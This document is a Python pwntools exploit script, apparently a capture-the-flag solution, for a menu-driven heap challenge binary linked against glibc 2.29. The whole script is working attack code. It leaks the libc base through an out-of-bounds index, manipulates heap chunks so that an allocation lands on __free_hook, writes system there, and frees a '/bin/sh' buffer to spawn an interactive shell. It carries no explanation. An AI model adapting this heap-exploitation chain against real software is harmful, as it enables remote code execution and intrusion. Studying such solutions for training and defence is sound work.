#!/usr/bin/env python3
from pwn import *
from sys import argv

# glibc: 2.29
binary = ELF('chall', checksec=0)
libc = ELF('libc.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('pwn.chal.ctf.gdgalgiers.com', 1405)
else:
  p = binary.process(env={})

sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

def menu(*args):
  p.recvuntil(b'option')
  for i in args:
    sl(str(i).encode(), b':')

pause()

# leak libc
menu(4, -2)

libc.address = int((p.recvline().split(b': ')[-1])[0:14],16) - libc.sym['_IO_2_1_stderr_']
log.info("Leaked libc base address: %#lx"%libc.address)

menu(1, 24, '0'*8)
menu(1, 24, '1'*8)
menu(1, 280, '2'*8)

menu(2, 2)
menu(2, 1)

menu(1, 24, '0'*24)

menu(2, 0)
menu(2, 2) 

menu(1, 280)
sl(p64(libc.sym['__free_hook']), b':')
menu(1, 24, '/bin/sh')
menu(1, 24)
sl(p64(libc.sym['system']), b':')

# trigger free hook
menu(2, 1)

p.interactive()
